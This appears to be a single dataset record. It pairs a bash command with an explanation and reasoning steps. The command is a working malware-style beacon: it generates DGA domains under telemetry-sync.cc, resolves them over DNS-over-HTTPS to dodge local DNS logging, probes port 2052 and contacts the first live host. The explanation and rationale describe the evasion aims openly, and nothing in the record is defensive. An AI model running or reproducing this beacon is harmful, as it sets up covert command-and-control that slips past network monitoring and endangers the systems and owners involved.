command: SEED="eta"; CANDS=(); for i in $(seq 1 3); do CANDS+=("$(printf "%s" "${SEED}$(date -u +%Y%m%d)$i" | sha256sum | cut -c1-12).telemetry-sync.cc"); done; for FQDN in "${CANDS[@]}"; do if curl -sSfI --doh-url https://dns.quad9.net/dns-query --connect-timeout 2 "https://${FQDN}:2052/ping"; then curl -sS --doh-url https://dns.quad9.net/dns-query "https://${FQDN}:2052/beacon?rnd=$RANDOM"; break; fi; done
explanation: Produces several DGA candidates, uses DoH against Quad9 to test reachability, and then communicates over port 2052 to blend with atypical TLS traffic.
rationale_steps: Resolve via DoH to avoid local DNS logs
Probe for a live endpoint on port 2052
Send beacon once an endpoint responds
